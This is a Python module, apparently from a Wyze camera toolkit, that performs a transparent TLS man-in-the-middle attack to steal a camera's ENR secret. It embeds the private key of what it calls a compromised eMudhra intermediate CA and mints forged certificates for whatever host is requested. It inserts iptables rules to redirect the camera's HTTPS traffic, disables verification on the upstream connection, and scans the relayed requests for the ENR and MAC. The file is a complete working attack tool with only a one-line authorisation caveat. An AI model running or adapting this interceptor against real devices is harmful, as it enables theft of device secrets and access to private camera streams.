"""ENR harvest: read the camera's ENR out of its own HTTPS calls.

The ENR is the per-camera secret the DTLS PSK is derived from. The camera
sends it in the JSON body of its POSTs to api.wyzecam.com (at boot, on
motion alarms, and every few hours). The camera's TLS client still trusts
the eMudhra "EM OV TLS CA - G3C" intermediate, whose private key is public
(the October 2026 eMudhra incident: P-384 key with d=4). So once we route
the camera, we can redirect its tcp/443 to a local TLS server that presents
a leaf for the requested name signed under that intermediate, relay to the
real server, and read the ENR off the request.
"""
import datetime as dt
import ipaddress
import json
import re
import select
import socket
import ssl
import struct
import tempfile
import threading
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

from .netutil import ipt

# Compromised "EM OV TLS CA - G3C" intermediate (key first) and its
# cross-certificates via "emSign Root TLS CA - G3" and Comodo "AAA
# Certificate Services"; the same material mitmproxy ships for --emudhra.
# Public knowledge -- only use it against devices you are authorized to test.
EMUDHRA_CHAIN_PEM = b"""

-----BEGIN PRIVATE KEY-----
MIG2AgEAMBAGByqGSM49AgEGBSuBBAAiBIGeMIGbAgEBBDAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAShZANiAAQTglHNUqyS
mMHIqtl3Mh3rl+cJvQtMoKylXcitUdz8nRWJoVl+OlEg4e/WMcY+GDXKyuKYaaYu
FjHoooGBq1ZhbcRdkYq8CfOrDmPPeSqk3O1zh743u6VpVJ8cArJw7Wc=
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDaDCCAu6gAwIBAgIPKWkmwiejoVJjkrGUgqUEMAoGCCqGSM49BAMDMFYxCzAJ
BgNVBAYTAklOMSUwIwYDVQQKDBxlTXVkaHJhIFRlY2hub2xvZ2llcyBMaW1pdGVk
MSAwHgYDVQQDDBdlbVNpZ24gUm9vdCBUTFMgQ0EgLSBHMzAeFw0yNTA0MzAxNTM3
NDFaFw00MDA0MjgxODMwMDBaMEAxCzAJBgNVBAYTAlVTMRQwEgYDVQQKDAtlTXVk
aHJhIEluYzEbMBkGA1UEAwwSRU0gT1YgVExTIENBIC0gRzNDMHYwEAYHKoZIzj0C
AQYFK4EEACIDYgAEE4JRzVKskpjByKrZdzId65fnCb0LTKCspV3IrVHc/J0ViaFZ
fjpRIOHv1jHGPhg1ysrimGmmLhYx6KKBgatWYW3EXZGKvAnzqw5jz3kqpNztc4e+
N7ulaVSfHAKycO1no4IBljCCAZIwHwYDVR0jBBgwFoAU4TqrIXzx401UrtRyt/2L
WUIgkFQwHQYDVR0OBBYEFDTq6gzryQra+dDF4u2beMmHnhtsMB0GA1UdJQQWMBQG
CCsGAQUFBwMBBggrBgEFBQcDAjBdBgNVHSAEVjBUMDkGCysGAQQBg44hAQABMCow
KAYIKwYBBQUHAgEWHGh0dHA6Ly9yZXBvc2l0b3J5LmVtc2lnbi5jb20wDQYLKwYB
BAGDjiEBAm4wCAYGZ4EMAQICMHUGCCsGAQUFBwEBBGkwZzAkBggrBgEFBQcwAYYY
aHR0cDovL29jc3AtYy5lbXNpZ24uY29tMD8GCCsGAQUFBzAChjNodHRwOi8vcmVw
b3NpdG9yeS5lbXNpZ24uY29tL2NlcnRzL0VNT1ZUTFNDQUczQy5wN2MwNwYDVR0f
BDAwLjAsoCqgKIYmaHR0cDovL2NybC5lbXNpZ24uY29tLz9yb290dGxzY2FnMy5j
cmwwDgYDVR0PAQH/BAQDAgEGMBIGA1UdEwEB/wQIMAYBAf8CAQAwCgYIKoZIzj0E
AwMDaAAwZQIxAMSZt2xsPeumRdeSMSQ3CbzIZeQ/q7GDCWfeE1Pq+mhgA6gRM44c
NVF3xJ+wsxJk+wIwFJbaDMokD8Ei6eNOiA8yUMYvfzQyngmrhZQMdPCK1SewrR79
4rSb9vGqxZzelQth
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIDdDCCAvmgAwIBAgIQAJYaPvsTWVdu0EAFtGhKWzAKBggqhkjOPQQDAzBrMQsw
CQYDVQQGEwJJTjETMBEGA1UECxMKZW1TaWduIFBLSTElMCMGA1UEChMcZU11ZGhy
YSBUZWNobm9sb2dpZXMgTGltaXRlZDEgMB4GA1UEAxMXZW1TaWduIEVDQyBSb290
IENBIC0gRzMwHhcNMjQwNzExMTU0MzM2WhcNMzkwNzA5MTgzMDAwWjBWMQswCQYD
VQQGEwJJTjElMCMGA1UECgwcZU11ZGhyYSBUZWNobm9sb2dpZXMgTGltaXRlZDEg
MB4GA1UEAwwXZW1TaWduIFJvb3QgVExTIENBIC0gRzMwdjAQBgcqhkjOPQIBBgUr
gQQAIgNiAARfD9w/q1cWxL6D9bMGH6CQ4u+gAV6GN9s+PwQx9Bl4hC+0iU8QOk8m
WO/RwXQy10DCSxT8vSIJClHKp+Ao4qJKdYeV0SwZ7LMQziyLfxIUOY6Grja/sQFw
LKYf8EdDXAyjggF1MIIBcTAfBgNVHSMEGDAWgBR8XQKEE9TMipuBzhccLikenEhj
QjAdBgNVHQ4EFgQU4TqrIXzx401UrtRyt/2LWUIgkFQwHQYDVR0lBBYwFAYIKwYB
BQUHAwEGCCsGAQUFBwMCMD0GA1UdIAQ2MDQwMgYEVR0gADAqMCgGCCsGAQUFBwIB
FhxodHRwOi8vcmVwb3NpdG9yeS5lbXNpZ24uY29tMHgGCCsGAQUFBwEBBGwwajAi
BggrBgEFBQcwAYYWaHR0cDovL29jc3AuZW1zaWduLmNvbTBEBggrBgEFBQcwAoY4
aHR0cDovL3JlcG9zaXRvcnkuZW1zaWduLmNvbS9jZXJ0cy9lbVNpZ25FQ0NSb290
Q0FHMy5jcnQwMwYDVR0fBCwwKjAooCagJIYiaHR0cDovL2NybC5lbXNpZ24uY29t
P1Jvb3RDQUczLmNybDAOBgNVHQ8BAf8EBAMCAQYwEgYDVR0TAQH/BAgwBgEB/wIB
ATAKBggqhkjOPQQDAwNpADBmAjEAt9CIpRGp46QHQYDUBnLKw+vvK0/h9vmilEAg
TroUl/anH4x2rXHqiCtBTBfgKDegAjEA8WpG1LTZdAIL0FSYqxXeREaeTSxEofM0
1jJH3jGvCXC79LU9UPJ2o3TU+UIj2gMV
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIDzzCCAregAwIBAgIRAI1aSBGTnvRH13ERzdmEmukwDQYJKoZIhvcNAQELBQAw
ezELMAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4G
A1UEBwwHU2FsZm9yZDEaMBgGA1UECgwRQ29tb2RvIENBIExpbWl0ZWQxITAfBgNV
BAMMGEFBQSBDZXJ0aWZpY2F0ZSBTZXJ2aWNlczAeFw0yNTA1MTQwMDAwMDBaFw0y
ODEyMzEyMzU5NTlaMEAxCzAJBgNVBAYTAlVTMRQwEgYDVQQKDAtlTXVkaHJhIElu
YzEbMBkGA1UEAwwSRU0gT1YgVExTIENBIC0gRzNDMHYwEAYHKoZIzj0CAQYFK4EE
ACIDYgAEE4JRzVKskpjByKrZdzId65fnCb0LTKCspV3IrVHc/J0ViaFZfjpRIOHv
1jHGPhg1ysrimGmmLhYx6KKBgatWYW3EXZGKvAnzqw5jz3kqpNztc4e+N7ulaVSf
HAKycO1no4IBNTCCATEwHwYDVR0jBBgwFoAUoBEKIz6W8Qfs4q8p74Klf9AwpLQw
HQYDVR0OBBYEFDTq6gzryQra+dDF4u2beMmHnhtsMA4GA1UdDwEB/wQEAwIBBjAS
BgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD
AjAxBgNVHSAEKjAoMAgGBmeBDAECAjANBgsrBgEEAYOOIQEAATANBgsrBgEEAYOO
IQECbjBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsLmNvbW9kb2NhLmNvbS9B
QUFDZXJ0aWZpY2F0ZVNlcnZpY2VzLmNybDA0BggrBgEFBQcBAQQoMCYwJAYIKwYB
BQUHMAGGGGh0dHA6Ly9vY3NwLmNvbW9kb2NhLmNvbTANBgkqhkiG9w0BAQsFAAOC
AQEAHlbhZpjhkPEAQVhPHRtBDaHqiisVD20pQ1TUeSx3l62Qe7NQ0b7vWQy7DN0i
KOu7BGpP5EnIjvXbz9FhpfPJ4FhKEt3tQ51rqXz2oD8vRaryvExWPobDUz3j7HN6
OzBsVMIe3PD7AAkpky0x8zMSi/ep5R9OMzybmNptbtppyuB5ytgq+h7lQdRIP+CQ
TaJX3qTgfMqzntYre5GljmEB5hU2/rSn8zoSU2APkJidlZFpghtgbD4I2VRHZvCw
FFr/SrFM9pwrgbJNZ1MtyTSVgI5NlNb0aMfLR+/r6jJt3ROeY2yh2QQ2dx+Yqgdb
uL5ChFWOQU+ErSDnUq7yr+pjBQ==
-----END CERTIFICATE-----
"""


SO_ORIGINAL_DST = 80
HARVEST_PORT = 18443
ENR_RE = re.compile(rb'"enr"\s*:\s*"((?:[^"\\]|\\.)+)"')
MAC_RE = re.compile(rb'"mac"\s*:\s*"([0-9A-Fa-f]{12})"')


def emudhra_chain():
    """(issuer key, issuer cert, [cross-certs])"""
    key = serialization.load_pem_private_key(EMUDHRA_CHAIN_PEM, password=None)
    certs = x509.load_pem_x509_certificates(EMUDHRA_CHAIN_PEM)
    return key, certs[0], certs[1:]


def mint_leaf(host, workdir):
    """Write a leaf for `host` under the eMudhra intermediate; returns
    (certfile with chain, keyfile)."""
    ikey, icert, cross = emudhra_chain()
    # RSA-2048 is what the camera was seen accepting
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    now = dt.datetime.now(dt.timezone.utc)
    try:
        san = x509.IPAddress(ipaddress.ip_address(host))
    except ValueError:
        san = x509.DNSName(host)
    cert = (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, host)]))
            .issuer_name(icert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - dt.timedelta(hours=1))
            .not_valid_after(now + dt.timedelta(days=30))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None),
                           critical=True)
            # strict validators reject leaves under this CA without SKI/AKI
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(
                key.public_key()), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(
                ikey.public_key()), critical=False)
            .add_extension(x509.SubjectAlternativeName([san]), critical=False)
            .sign(ikey, hashes.SHA384()))
    safe = re.sub(r"[^A-Za-z0-9.-]", "_", host)[:80]
    certfile, keyfile = Path(workdir) / f"{safe}.crt", Path(workdir) / f"{safe}.key"
    keyfile.write_bytes(key.private_bytes(serialization.Encoding.PEM,
                                          serialization.PrivateFormat.PKCS8,
                                          serialization.NoEncryption()))
    certfile.write_bytes(b"".join(c.public_bytes(serialization.Encoding.PEM)
                                  for c in (cert, icert, *cross)))
    return str(certfile), str(keyfile)


def find_enr(buf):
    """(enr, mac or None) from an HTTP request buffer, or None."""
    m = ENR_RE.search(buf)
    if not m:
        return None
    enr = json.loads(b'"' + m.group(1) + b'"')
    mac = MAC_RE.search(buf)
    return enr, mac.group(1).decode().upper() if mac else None


def original_dst(sock):
    raw = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    port = struct.unpack(">H", raw[2:4])[0]
    return socket.inet_ntoa(raw[4:8]), port


class Harvester:
    """Transparent TLS interceptor for the camera's tcp/443.

    Every connection is relayed to its real destination, so the camera's
    cloud calls keep working; only the client->server bytes are read. The
    redirect is removed by stop(), which callers do as soon as the ENR is
    in hand."""

    def __init__(self, cam_ip, us, port=HARVEST_PORT):
        self.cam_ip, self.us, self.port = cam_ip, us, port
        self.found = threading.Event()
        self.enr = self.mac = None
        self.hosts = {}
        self._work = tempfile.mkdtemp(prefix="wyze-splice-certs-")
        self._ctx_lock = threading.Lock()
        self._rules = [
            ("-t", "nat", "PREROUTING", "-s", cam_ip, "-p", "tcp",
             "--dport", "443", "-j", "REDIRECT", "--to-ports", str(port)),
            ("-t", "filter", "INPUT", "-s", cam_ip, "-p", "tcp",
             "--dport", str(port), "-j", "ACCEPT"),
        ]
        self._installed = []

    def _ctx_for(self, host):
        with self._ctx_lock:
            ctx = self.hosts.get(host)
            if ctx is None:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(*mint_leaf(host, self._work))
                ctx.sni_callback = self._pick
                self.hosts[host] = ctx
            return ctx

    def _pick(self, sslsock, name, _ctx):
        # remember the name for the upstream leg, then present a leaf for it
        sslsock.sni_name = name
        if name:
            sslsock.context = self._ctx_for(name)

    def start(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", self.port))
        srv.listen(32)
        self._srv = srv
        threading.Thread(target=self._accept, daemon=True).start()
        for r in self._rules:
            if ipt(r[0], r[1], "-I", r[2], "1", *r[3:]).returncode == 0:
                self._installed.append(r)

    def stop(self):
        for r in reversed(self._installed):
            ipt(r[0], r[1], "-D", r[2], *r[3:])
        self._installed = []
        try:
            self._srv.close()
        except OSError:
            pass

    def _accept(self):
        while True:
            try:
                c, _ = self._srv.accept()
            except OSError:
                return
            threading.Thread(target=self._handle, args=(c,), daemon=True).start()

    def _handle(self, c):
        up = None
        try:
            dst = original_dst(c)
            c.settimeout(15)
            # without SNI the leaf names the destination IP
            tc = self._ctx_for(dst[0]).wrap_socket(c, server_side=True)
            sni = getattr(tc, "sni_name", None)
            cctx = ssl.create_default_context()
            cctx.check_hostname = False
            cctx.verify_mode = ssl.CERT_NONE
            raw = socket.create_connection(dst, timeout=15)
            up = cctx.wrap_socket(raw, server_hostname=sni)
            self._relay(tc, up)
        except (OSError, ssl.SSLError, ValueError):
            pass
        finally:
            for s in (c, up):
                try:
                    s and s.close()
                except OSError:
                    pass

    def _relay(self, a, b):
        """Pump a<->b until either side closes; scan a->b for the ENR."""
        seen = b""
        for s in (a, b):
            s.settimeout(1)
        while True:
            ready = [s for s in (a, b) if s.pending()]
            if not ready:
                ready, _, _ = select.select([a, b], [], [], 30)
                if not ready:
                    return
            for s in ready:
                try:
                    data = s.recv(65536)
                except (socket.timeout, ssl.SSLWantReadError):
                    continue
                if not data:
                    return
                (b if s is a else a).sendall(data)
                if s is a and not self.found.is_set():
                    seen = (seen + data)[-65536:]
                    hit = find_enr(seen)
                    if hit:
                        self.enr, self.mac = hit
                        self.found.set()
